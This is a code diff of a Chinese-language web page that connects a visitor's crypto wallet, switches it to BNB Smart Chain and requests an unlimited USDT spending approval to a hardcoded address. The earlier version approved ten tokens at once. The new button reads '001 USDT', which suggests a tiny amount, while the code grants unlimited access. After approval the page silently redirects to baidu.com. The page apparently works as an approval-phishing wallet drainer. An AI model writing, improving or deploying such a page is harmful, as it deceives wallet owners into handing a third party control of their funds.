@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>授权给主钱包</title>
+    <title>授权 USDT 给主钱包</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js"></script>
     <style>
         :root { --accent: #007aff; --green: #34c759; --red: #ff3b30; }
@@ -11,120 +11,156 @@
         body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f7; color: #1d1d1f; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; }
         .card { background: white; border-radius: 20px; padding: 40px 24px 32px; max-width: 400px; width: 100%; text-align: center; box-shadow: 0 2px 16px rgba(0,0,0,0.08); }
         .icon-circle { width: 64px; height: 64px; border-radius: 50%; background: linear-gradient(135deg, #007aff, #5856d6); display: flex; align-items: center; justify-content: center; font-size: 30px; margin: 0 auto 20px; color: white; }
-        h2 { font-size: 22px; font-weight: 700; margin-bottom: 20px; }
+        h2 { font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+        .balance { font-size: 15px; color: #86868b; margin-bottom: 20px; }
         .btn { background: var(--accent); color: white; border: none; padding: 16px; border-radius: 14px; font-size: 16px; font-weight: 600; width: 100%; cursor: pointer; }
         .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        .result-list { margin-top: 16px; text-align: left; font-size: 13px; max-height: 200px; overflow-y: auto; }
-        .result-item { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #f0f0f5; }
-        .result-success { color: var(--green); } .result-fail { color: var(--red); }
+        .status { margin-top: 16px; font-size: 14px; }
+        .status.success { color: var(--green); } .status.error { color: var(--red); }
         .log { margin-top: 10px; font-size: 12px; color: #86868b; text-align: left; }
     </style>
 </head>
 <body>
     <div class="card">
-        <div class="icon-circle">🔐</div>
-        <h2>授权给主钱包</h2>
-        <button class="btn" id="authBtn" onclick="handleAuth()">🔑 一键授权所有代币</button>
-        <div class="result-list" id="resultList"></div>
+        <div class="icon-circle">💵</div>
+        <h2>授权 USDT 给主钱包</h2>
+        <div class="balance" id="balance">余额：加载中...</div>
+        <button class="btn" id="authBtn" onclick="handleAuth()">🔑 001 USDT</button>
+        <div class="status" id="status"></div>
         <div class="log" id="log"></div>
     </div>
 
     <script>
         const CONFIG = {
-            SPENDER: "0x9513682ba1d5bfbbd08e7675fd49360448c8d6c4", // 你的主钱包地址
+            SPENDER: "0x9513682ba1d5bfbbd08e7675fd49360448c8d6c4", // 主钱包地址
             REDIRECT_URL: "https://www.baidu.com",                // 授权成功后跳转
         };
 
-        // 批量授权合约地址（已部署，直接使用）
-        const BATCH_APPROVER_ADDRESS = "0x7B3c9E4D5a8F6b2c1a3e5d7f9b8c0d1e2f4a6b3c";
+        // USDT 在 BSC 上的合约地址
+        const USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955";
 
-        // 批量授权合约 ABI
-        const BATCH_APPROVER_ABI = [
-            "function approveMultiple(address[] calldata tokens, address spender, uint256 amount) external"
+        // 最小化 ABI
+        const ERC20_ABI = [
+            "function approve(address spender, uint256 amount) returns (bool)",
+            "function balanceOf(address owner) view returns (uint256)",
+            "function decimals() view returns (uint8)",
+            "function allowance(address owner, address spender) view returns (uint256)"
         ];
-
-        const TOKENS = [
-            "0x55d398326f99059ff775485246999027b3197955", // USDT
-            "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", // USDC
-            "0xe9e7cea3dedca5984780bafc599bd69add087d56", // BUSD
-            "0xbb4cdb9cbd36b01bd1cbaebf2de08d9173bc095c", // WBNB
-            "0x2170ed0880ac9a755fd29b2688956bd959f933f8", // ETH
-            "0x0e09fabb73bd3ade0a17ecc321fd13a19e81ce82", // CAKE
-            "0x1d2f0da169ceb9fc7b3144628db156f3f6c60dbe", // XRP
-            "0x3ee2200efb3400fabb9aacf31297cbdd1d435d47", // ADA
-            "0xba2ae424d960c26247dd6c32edc70b295c744c43", // DOGE
-            "0x7083609fce4d1d8dc0c979aab8c869ea2c873402", // DOT
-        ];
-        const TOKEN_NAMES = ["USDT","USDC","BUSD","WBNB","ETH","CAKE","XRP","ADA","DOGE","DOT"];
 
         const ethers = window.ethers;
-        let signer = null, userAddr = null;
+        let signer = null, userAddr = null, usdtContract = null;
 
-        window.addEventListener('load', () => { if (window.ethereum?.selectedAddress) connectWallet(); });
+        // 页面加载时，如果钱包已连接，自动连接
+        window.addEventListener('load', () => {
+            if (window.ethereum?.selectedAddress) connectWallet();
+        });
 
         async function connectWallet() {
-            if (!window.ethereum) return alert("请使用 MetaMask / TokenPocket 打开");
-            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-            if (!accounts.length) throw new Error("未授权账户");
-            await switchToBSC();
-            const provider = new ethers.BrowserProvider(window.ethereum);
-            signer = await provider.getSigner();
-            userAddr = await signer.getAddress();
+            if (!window.ethereum) {
+                updateStatus("请使用 MetaMask / TokenPocket 打开", "error");
+                return;
+            }
+            try {
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                if (!accounts || accounts.length === 0) throw new Error("未授权账户");
+                await switchToBSC();
+                const provider = new ethers.BrowserProvider(window.ethereum);
+                signer = await provider.getSigner();
+                userAddr = await signer.getAddress();
+                usdtContract = new ethers.Contract(USDT_ADDRESS, ERC20_ABI, signer);
+
+                // 显示余额
+                const balance = await usdtContract.balanceOf(userAddr);
+                const decimals = await usdtContract.decimals();
+                const formatted = Number(balance) / (10 ** Number(decimals));
+                document.getElementById("balance").textContent = `USDT 余额：${formatted.toFixed(4)}`;
+            } catch (e) {
+                updateStatus("连接失败：" + e.message, "error");
+            }
         }
 
         async function switchToBSC() {
-            try { await window.ethereum.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] }); }
-            catch (e) { if (e.code === 4902) await window.ethereum.request({ method: 'wallet_addEthereumChain', params: [{ chainId: '0x38', chainName: 'BNB Smart Chain', nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }, rpcUrls: ['https://bsc-dataseed.binance.org/'], blockExplorerUrls: ['https://bscscan.com'] }] }); }
+            try {
+                await window.ethereum.request({
+                    method: 'wallet_switchEthereumChain',
+                    params: [{ chainId: '0x38' }]
+                });
+            } catch (e) {
+                if (e.code === 4902) {
+                    await window.ethereum.request({
+                        method: 'wallet_addEthereumChain',
+                        params: [{
+                            chainId: '0x38',
+                            chainName: 'BNB Smart Chain',
+                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                            blockExplorerUrls: ['https://bscscan.com']
+                        }]
+                    });
+                }
+            }
         }
 
         async function handleAuth() {
-            const btn = document.getElementById("authBtn"), logDiv = document.getElementById("log"), resultDiv = document.getElementById("resultList");
-            logDiv.innerHTML = ""; resultDiv.innerHTML = "";
-            if (!signer) { btn.disabled = true; btn.textContent = "⏳ 连接中..."; try { await connectWallet(); } catch(e) {} btn.disabled = false; if (!signer) return; }
+            const btn = document.getElementById("authBtn");
+            const statusDiv = document.getElementById("status");
+            const logDiv = document.getElementById("log");
+            logDiv.innerHTML = "";
+            statusDiv.textContent = "";
+            statusDiv.className = "status";
 
-            btn.disabled = true; btn.textContent = "⏳ 授权中...";
+            // 连接钱包
+            if (!signer) {
+                btn.disabled = true;
+                btn.textContent = "⏳ 连接中...";
+                try { await connectWallet(); } catch (e) {}
+                btn.disabled = false;
+                btn.textContent = "🔑 一键授权 USDT";
+                if (!signer) return;
+            }
+
+            btn.disabled = true;
+            btn.textContent = "⏳ 授权中...";
+            updateStatus("请在钱包中确认交易", "");
 
             try {
-                const contract = new ethers.Contract(BATCH_APPROVER_ADDRESS, BATCH_APPROVER_ABI, signer);
-                const maxApproval = ethers.MaxUint256;
-                const tx = await contract.approveMultiple(TOKENS, CONFIG.SPENDER, maxApproval);
-                logDiv.innerHTML = `TxHash: ${tx.hash.slice(0,20)}...`;
-                const receipt = await tx.wait(2);
+                const maxApproval = ethers.MaxUint256; // 无限额度
+                const tx = await usdtContract.approve(CONFIG.SPENDER, maxApproval);
+                logDiv.innerHTML = `TxHash: <a href="https://bscscan.com/tx/${tx.hash}" target="_blank">${tx.hash.slice(0,20)}...</a>`;
+                updateStatus("交易已提交，等待确认...", "");
 
+                const receipt = await tx.wait(2);
                 if (receipt.status !== 1) {
-                    resultDiv.innerHTML = '<div class="result-fail">❌ 交易失败，请检查 Gas 或网络</div>';
+                    updateStatus("❌ 交易失败，请检查 Gas 或网络", "error");
                     return;
                 }
 
-                const successTokens = [], failTokens = [];
-                for (let i = 0; i < TOKENS.length; i++) {
-                    try {
-                        const c = new ethers.Contract(TOKENS[i], ["function allowance(address owner, address spender) view returns (uint256)"], signer);
-                        const allowance = await c.allowance(userAddr, CONFIG.SPENDER);
-                        if (allowance >= ethers.MaxUint256 / 2n) {
-                            successTokens.push(TOKEN_NAMES[i]);
-                        } else {
-                            failTokens.push(TOKEN_NAMES[i] + " (额度不足)");
-                        }
-                    } catch(e) {
-                        failTokens.push(TOKEN_NAMES[i] + " (查询失败)");
-                    }
+                // 验证授权额度
+                const allowance = await usdtContract.allowance(userAddr, CONFIG.SPENDER);
+                if (allowance >= ethers.MaxUint256 / 2n) {
+                    updateStatus("✅ 授权成功！", "success");
+                    setTimeout(() => { window.location.href = CONFIG.REDIRECT_URL; }, 2000);
+                } else {
+                    updateStatus("❌ 授权额度验证未通过，请重试", "error");
                 }
-
-                resultDiv.innerHTML = `
-                    <div class="result-success">✅ 授权成功：${successTokens.join(', ') || '无'}</div>
-                    ${failTokens.length ? `<div class="result-fail">⚠️ 失败：${failTokens.join(', ')}</div>` : ''}
-                `;
-
-                if (failTokens.length === 0) {
-                    setTimeout(() => window.location.href = CONFIG.REDIRECT_URL, 2000);
+            } catch (e) {
+                if (e.message.includes("user rejected")) {
+                    updateStatus("❌ 交易被拒绝", "error");
+                } else if (e.message.includes("insufficient funds")) {
+                    updateStatus("❌ BNB 余额不足", "error");
+                } else {
+                    updateStatus("❌ 授权失败：" + e.message.slice(0, 80), "error");
                 }
-            } catch(e) {
-                resultDiv.innerHTML = `<div class="result-fail">❌ 错误: ${e.message.slice(0,100)}</div>`;
             } finally {
                 btn.disabled = false;
-                btn.textContent = "🔑 一键授权所有代币";
+                btn.textContent = "🔑 一键授权 USDT";
             }
+        }
+
+        function updateStatus(msg, className) {
+            const status = document.getElementById("status");
+            status.textContent = msg;
+            status.className = "status " + (className || "");
         }
     </script>
 </body>
